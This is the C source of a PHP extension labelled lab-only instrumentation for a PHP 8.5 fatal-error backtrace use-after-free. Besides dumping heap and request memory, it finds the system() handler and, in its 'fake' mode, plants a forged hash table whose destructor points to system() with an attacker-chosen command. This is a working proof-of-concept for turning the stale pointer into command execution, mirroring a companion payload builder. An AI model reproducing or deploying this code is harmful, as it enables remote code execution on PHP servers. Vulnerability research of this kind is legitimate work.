/*
 * p2s85probe -- lab-only instrumentation for the PHP 8.5 fatal-backtrace path.
 *
 * Never load this outside a disposable localhost container. It is not a
 * hardening or production extension: it walks request heap memory, including
 * memory that the engine believes is free.
 *
 * Log destination: $P2S85_LOG (default /out/p2s85-probe.log).
 */
#ifdef HAVE_CONFIG_H
# include "config.h"
#endif

#include "php.h"
#include "php_ini.h"
#include "ext/standard/info.h"
#include "zend_exceptions.h"
#include "SAPI.h"

#include <fcntl.h>
#include <inttypes.h>
#include <stdarg.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define P2S_CHUNK_SIZE 0x200000UL
#define P2S_LINE 8192

static int p2s_fd = -1;
static void (*p2s_orig_error_cb)(int, zend_string *, const uint32_t, zend_string *);
static uintptr_t p2s_stale_addr;
static uintptr_t p2s_zif;
static int p2s_mode_clear, p2s_mode_fake;
static unsigned char p2s_fake[4096] __attribute__((aligned(16)));

static void p2s_put32(unsigned char *p, size_t off, uint32_t v)
{
	memcpy(p + off, &v, 4);
}

static void p2s_put64(unsigned char *p, size_t off, uint64_t v)
{
	memcpy(p + off, &v, 8);
}

/* Same 8.5 layout as payload.build_ht(): pDestructor at 0x30, arData at 0x10. */
static uintptr_t p2s_build_fake(void)
{
	unsigned char *h = p2s_fake;
	uintptr_t s = (uintptr_t) h;
	const char *cmd = getenv("P2S85_CMD");
	size_t len;

	if (!p2s_zif) {
		return 0;
	}
	if (!cmd || !*cmd) {
		cmd = "id > /out/rce85-fpm-instrumented-proof";
	}
	len = strlen(cmd);
	memset(h, 0, sizeof(p2s_fake));
	p2s_put32(h, 0x00, 1);              /* gc.refcount */
	p2s_put32(h, 0x04, 7);              /* gc.type = IS_ARRAY */
	p2s_put32(h, 0x08, 0x10);           /* HASH_FLAG_STATIC_KEYS */
	p2s_put32(h, 0x0c, 0xFFFFFFF8u);    /* nTableMask */
	p2s_put64(h, 0x10, s + 0x20);       /* arData */
	p2s_put32(h, 0x18, 1);              /* nNumUsed */
	p2s_put32(h, 0x1c, 1);              /* nNumOfElements */
	p2s_put64(h, 0x30, p2s_zif);        /* pDestructor */
	/* fake execute_data at 0x20, overlapping bucket[0] */
	p2s_put64(h, 0x30, p2s_zif);
	p2s_put32(h, 0x4c, 1);
	p2s_put64(h, 0x70, s + 0x80);
	p2s_put32(h, 0x78, 6);
	/* fake zend_string at 0x80 */
	p2s_put32(h, 0x80, 1);
	p2s_put32(h, 0x84, 0x0106);
	p2s_put64(h, 0x90, len);
	memcpy(h + 0x98, cmd, len + 1);
	return s;
}

static void p2s_writef(const char *fmt, ...)
{
	char buf[P2S_LINE];
	va_list ap;
	int n;

	if (p2s_fd < 0) {
		return;
	}
	va_start(ap, fmt);
	n = vsnprintf(buf, sizeof(buf), fmt, ap);
	va_end(ap);
	if (n <= 0) {
		return;
	}
	if (n > (int) sizeof(buf) - 1) {
		n = (int) sizeof(buf) - 1;
	}
	(void) write(p2s_fd, buf, (size_t) n);
}

static const char *p2s_type_name(int type)
{
	switch (type) {
		case IS_UNDEF: return "UNDEF";
		case IS_NULL: return "NULL";
		case IS_FALSE: return "FALSE";
		case IS_TRUE: return "TRUE";
		case IS_LONG: return "LONG";
		case IS_DOUBLE: return "DOUBLE";
		case IS_STRING: return "STRING";
		case IS_ARRAY: return "ARRAY";
		case IS_OBJECT: return "OBJECT";
		case IS_RESOURCE: return "RESOURCE";
		case IS_REFERENCE: return "REFERENCE";
		default: return "?";
	}
}

static void p2s_dump_bytes(const char *tag, const void *ptr, size_t len)
{
	const unsigned char *p = ptr;
	size_t i;

	p2s_writef("%s bytes@%p len=%zu:", tag, ptr, len);
	for (i = 0; i < len; i++) {
		if ((i & 15) == 0) {
			p2s_writef("\n%s  +%03zx:", tag, i);
		}
		p2s_writef(" %02x", p[i]);
	}
	p2s_writef("\n");
}

static void p2s_log_string(const char *tag, zend_string *s)
{
	if (!s) {
		p2s_writef("%s (null zend_string)\n", tag);
		return;
	}
	p2s_writef("%s ptr=%p len=%zu refc=%u hash=%08x val=\"%.*s\"\n",
		tag, (void *) s, ZSTR_LEN(s), GC_REFCOUNT(s), ZSTR_H(s),
		(int) (ZSTR_LEN(s) > 120 ? 120 : ZSTR_LEN(s)), ZSTR_VAL(s));
}

static void p2s_dump_frames(const char *tag, HashTable *bt)
{
	zval *frame;
	uint32_t i = 0;

	ZEND_HASH_FOREACH_VAL(bt, frame) {
		if (Z_TYPE_P(frame) == IS_ARRAY) {
			HashTable *fh = Z_ARRVAL_P(frame);
			uintptr_t hp = (uintptr_t) fh;
			zval *fname = zend_hash_str_find(fh, "function", sizeof("function") - 1);
			zval *file = zend_hash_str_find(fh, "file", sizeof("file") - 1);
			zval *line = zend_hash_str_find(fh, "line", sizeof("line") - 1);
			zval *args = zend_hash_str_find(fh, "args", sizeof("args") - 1);

			p2s_writef("%s frame[%u] ht=%p off=%#zx refc=%u nUsed=%u nElems=%u arData=%p\n",
				tag, i, (void *) fh, (size_t) (hp & (P2S_CHUNK_SIZE - 1)),
				GC_REFCOUNT(fh), fh->nNumUsed, fh->nNumOfElements,
				(void *) fh->arData);
			if (fname && Z_TYPE_P(fname) == IS_STRING) {
				p2s_log_string("  function", Z_STR_P(fname));
			}
			if (file && Z_TYPE_P(file) == IS_STRING) {
				p2s_log_string("  file", Z_STR_P(file));
			}
			if (line && Z_TYPE_P(line) == IS_LONG) {
				p2s_writef("  line=%" PRIi64 "\n", Z_LVAL_P(line));
			}
			if (args && Z_TYPE_P(args) == IS_ARRAY) {
				HashTable *ah = Z_ARRVAL_P(args);
				zval *arg;
				uint32_t j = 0;

				p2s_writef("  args ht=%p off=%#zx refc=%u nUsed=%u nElems=%u\n",
					(void *) ah, (size_t) (((uintptr_t) ah) & (P2S_CHUNK_SIZE - 1)),
					GC_REFCOUNT(ah), ah->nNumUsed, ah->nNumOfElements);
				ZEND_HASH_FOREACH_VAL(ah, arg) {
					p2s_writef("    arg[%u] zval@%p type=%d(%s)",
						j, (void *) arg, Z_TYPE_P(arg), p2s_type_name(Z_TYPE_P(arg)));
					if (Z_TYPE_P(arg) == IS_OBJECT) {
						zend_object *obj = Z_OBJ_P(arg);
						p2s_writef(" obj=%p handle=%u ce=%s",
							(void *) obj, (unsigned) obj->handle,
							obj->ce && obj->ce->name ? ZSTR_VAL(obj->ce->name) : "?");
					} else if (Z_TYPE_P(arg) == IS_STRING) {
						p2s_writef(" str=%p len=%zu", (void *) Z_STR_P(arg),
							Z_STRLEN_P(arg));
					} else if (Z_TYPE_P(arg) == IS_LONG) {
						p2s_writef(" long=%" PRIi64, Z_LVAL_P(arg));
					}
					p2s_writef("\n");
					j++;
				} ZEND_HASH_FOREACH_END();
			}
		} else {
			p2s_writef("%s frame[%u] type=%d(%s) (not an array)\n",
				tag, i, Z_TYPE_P(frame), p2s_type_name(Z_TYPE_P(frame)));
		}
		i++;
	} ZEND_HASH_FOREACH_END();
}

static void p2s_dump_zval(const char *tag, const zval *zv)
{
	uintptr_t zv_addr = (uintptr_t) zv;

	p2s_writef("%s zval=%p type=%d(%s) u1=%#" PRIx64 " u2=%#" PRIx64 "\n",
		tag, (void *) zv, Z_TYPE_P(zv), p2s_type_name(Z_TYPE_P(zv)),
		(uint64_t) zv->value.lval, (uint64_t) Z_TYPE_INFO_P(zv));

	if (Z_TYPE_P(zv) != IS_ARRAY) {
		return;
	}

	{
		HashTable *ht = Z_ARRVAL_P(zv);
		uintptr_t hp = (uintptr_t) ht;
		uintptr_t chunk = hp & ~(uintptr_t) (P2S_CHUNK_SIZE - 1);

		p2s_writef("%s ht=%p chunk=%p off=%#zx refc=%u gc_info=%#x flags=%#x mask=%#x "
			"arData=%p nUsed=%u nElems=%u nSize=%u nIntPtr=%u nNext=%" PRIi64 " pDtor=%p\n",
			tag, (void *) ht, (void *) chunk, (size_t) (hp - chunk),
			GC_REFCOUNT(ht), GC_INFO(ht), ht->u.flags, ht->nTableMask,
			(void *) ht->arData, ht->nNumUsed, ht->nNumOfElements,
			ht->nTableSize, ht->nInternalPointer, (int64_t) ht->nNextFreeElement,
			(void *) ht->pDestructor);
		p2s_dump_bytes(tag, ht, 0x40);
		if (ht->arData) {
			p2s_dump_bytes(tag, ht->arData, 0x80);
		}
		p2s_dump_frames(tag, ht);
	}
	(void) zv_addr;
}

static void p2s_error_cb(int type, zend_string *file, const uint32_t line,
	zend_string *message)
{
	p2s_writef("!! error_cb pid=%d type=%d line=%u file=%s msg=\"%.*s\"\n",
		(int) getpid(), type, line,
		file ? ZSTR_VAL(file) : "[none]",
		message ? (int) (ZSTR_LEN(message) > 200 ? 200 : ZSTR_LEN(message)) : 5,
		message ? ZSTR_VAL(message) : "[null]");
	p2s_dump_zval("error_cb", &EG(last_fatal_error_backtrace));
	if (p2s_orig_error_cb) {
		p2s_orig_error_cb(type, file, line, message);
	}
}

PHP_MINIT_FUNCTION(p2s85probe)
{
	const char *path = getenv("P2S85_LOG");
	if (!path || !*path) {
		path = "/out/p2s85-probe.log";
	}
	p2s_fd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0666);
	{
		const char *m = getenv("P2S85_EXT_MODE");
		p2s_mode_clear = m && strcmp(m, "clear") == 0;
		p2s_mode_fake = m && strcmp(m, "fake") == 0;
	}
	p2s_writef("== MINIT pid=%d ex=%p bt_field=%p ts=%" PRIi64 " ext_mode=%s\n",
		(int) getpid(), (void *) &executor_globals,
		(void *) &EG(last_fatal_error_backtrace), (int64_t) time(NULL),
		p2s_mode_fake ? "fake" : (p2s_mode_clear ? "clear" : "log"));
	{
		zend_function *sys = zend_hash_str_find_ptr(CG(function_table), "system", sizeof("system") - 1);
		if (sys && sys->type == ZEND_INTERNAL_FUNCTION) {
			char zifbuf[32];
			snprintf(zifbuf, sizeof(zifbuf), "0x%lx",
				(unsigned long) sys->internal_function.handler);
			setenv("P2S85_ZIF", zifbuf, 1);
			p2s_zif = (uintptr_t) sys->internal_function.handler;
			p2s_writef("== ZIF_SYSTEM pid=%d handler=%p\n",
				(int) getpid(), (void *) sys->internal_function.handler);
		} else {
			p2s_writef("== ZIF_SYSTEM pid=%d not found (sys=%p)\n",
				(int) getpid(), (void *) sys);
		}
	}
	p2s_orig_error_cb = zend_error_cb;
	zend_error_cb = p2s_error_cb;
	return SUCCESS;
}

PHP_MSHUTDOWN_FUNCTION(p2s85probe)
{
	if (zend_error_cb == p2s_error_cb) {
		zend_error_cb = p2s_orig_error_cb;
	}
	p2s_writef("== MSHUTDOWN pid=%d\n", (int) getpid());
	if (p2s_fd >= 0) {
		close(p2s_fd);
		p2s_fd = -1;
	}
	return SUCCESS;
}

PHP_RINIT_FUNCTION(p2s85probe)
{
	p2s_writef("-- RINIT pid=%d uri=%s stale=%p auth_user=%p auth_pass=%p path=%p\n",
		(int) getpid(),
		SG(request_info).request_uri ? SG(request_info).request_uri : "[none]",
		(void *) p2s_stale_addr,
		(void *) SG(request_info).auth_user,
		(void *) SG(request_info).auth_password,
		(void *) SG(request_info).path_translated);
	if (p2s_stale_addr) {
		p2s_dump_bytes("rinit_stale", (void *) p2s_stale_addr, 0x40);
	}
	p2s_dump_zval("rinit", &EG(last_fatal_error_backtrace));
	return SUCCESS;
}

PHP_RSHUTDOWN_FUNCTION(p2s85probe)
{
	p2s_writef("-- RSHUTDOWN pid=%d uri=%s in_shutdown=%d\n",
		(int) getpid(),
		SG(request_info).request_uri ? SG(request_info).request_uri : "[none]",
		(EG(flags) & EG_FLAGS_IN_SHUTDOWN) != 0);
	p2s_dump_zval("rshutdown", &EG(last_fatal_error_backtrace));
	if (Z_TYPE(EG(last_fatal_error_backtrace)) == IS_ARRAY) {
		p2s_stale_addr = (uintptr_t) Z_ARRVAL(EG(last_fatal_error_backtrace));
	}
	return SUCCESS;
}

static zend_result p2s_post_deactivate(void)
{
	p2s_writef("-- POST_DEACTIVATE pid=%d ext_mode=%s\n", (int) getpid(),
		p2s_mode_fake ? "fake" : (p2s_mode_clear ? "clear" : "log"));
	p2s_dump_zval("post_deactivate", &EG(last_fatal_error_backtrace));
	if (Z_TYPE(EG(last_fatal_error_backtrace)) == IS_ARRAY) {
		p2s_stale_addr = (uintptr_t) Z_ARRVAL(EG(last_fatal_error_backtrace));
		if (p2s_mode_clear) {
			ZVAL_UNDEF(&EG(last_fatal_error_backtrace));
			p2s_writef("   cleared stale zval at %p\n", (void *) p2s_stale_addr);
		} else if (p2s_mode_fake) {
			uintptr_t fake = p2s_build_fake();
			if (fake) {
				ZVAL_ARR(&EG(last_fatal_error_backtrace), (zend_array *) fake);
				p2s_writef("   installed fake array %p pDestructor=%p cmd=%s\n",
					(void *) fake, (void *) p2s_zif,
					getenv("P2S85_CMD") ? getenv("P2S85_CMD") : "(default)");
			}
		}
	}
	return SUCCESS;
}

PHP_MINFO_FUNCTION(p2s85probe)
{
	php_info_print_table_start();
	php_info_print_table_row(2, "p2s85probe", "lab instrumentation");
	php_info_print_table_end();
}

zend_module_entry p2s85probe_module_entry = {
	STANDARD_MODULE_HEADER,
	"p2s85probe",
	NULL,
	PHP_MINIT(p2s85probe),
	PHP_MSHUTDOWN(p2s85probe),
	PHP_RINIT(p2s85probe),
	PHP_RSHUTDOWN(p2s85probe),
	PHP_MINFO(p2s85probe),
	"0.1-lab",
	NO_MODULE_GLOBALS, p2s_post_deactivate,
	0, 0, NULL, 0, ZEND_MODULE_BUILD_ID
};

#ifdef COMPILE_DL_P2S85PROBE
ZEND_GET_MODULE(p2s85probe)
#endif
